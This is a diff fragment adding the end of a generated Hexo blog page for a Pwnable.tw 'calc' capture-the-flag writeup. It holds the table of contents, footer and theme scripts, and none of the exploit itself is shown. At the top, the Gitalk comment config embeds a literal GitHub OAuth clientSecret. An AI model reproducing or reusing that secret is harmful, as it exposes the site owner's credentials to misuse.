+                    clientSecret: 'dc6a9d6490a92521e96b38717770845226846c62',
+                    repo: 'kazmatw.github.io',
+                    owner: 'kazmatw',
+                    admin: ['kazmatw'],
+                    id: __gitalk__pathname,
+                    language: 'en'
+                }).render('gitalk-container');
+
+            } catch (e) {
+                window.Gitalk = null;
+            }
+        }
+
+        if ('true') {
+            const loadGitalkTimeout = setTimeout(() => {
+                loadGitalk();
+                clearTimeout(loadGitalkTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadGitalk);
+        }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Pwnable.tw calc Writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwnable-tw-calc"><span class="nav-text">Pwnable.tw - calc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Source"><span class="nav-text">Source</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1-Initial-Reconnaissance"><span class="nav-text">0x1 Initial Reconnaissance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file"><span class="nav-text">file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec"><span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#calc"><span class="nav-text">.&#x2F;calc</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-Reverse-Engineering"><span class="nav-text">0x2 Reverse Engineering</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#main"><span class="nav-text">main()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#calc-1"><span class="nav-text">calc()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-expr"><span class="nav-text">get_expr()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#parse-expr"><span class="nav-text">parse_expr()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-text">eval()</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x3-Fuzzing-Analyze"><span class="nav-text">0x3 Fuzzing &amp; Analyze</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Case-1-x"><span class="nav-text">Case 1: +x</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Case-2-x-y"><span class="nav-text">Case 2: +x+y</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E6%95%B8%E5%8C%96%E7%B5%90%E8%AB%96"><span class="nav-text">代數化結論</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B5%90%E8%AB%96%E6%AD%A3%E7%A2%BA%EF%BC%81"><span class="nav-text">結論正確！</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x4-Exploit"><span class="nav-text">0x4 Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x5-Exploit"><span class="nav-text">0x5 Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x6-References"><span class="nav-text">0x6 References</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Pwned"><span class="nav-text">Pwned !!!</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">kazma</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
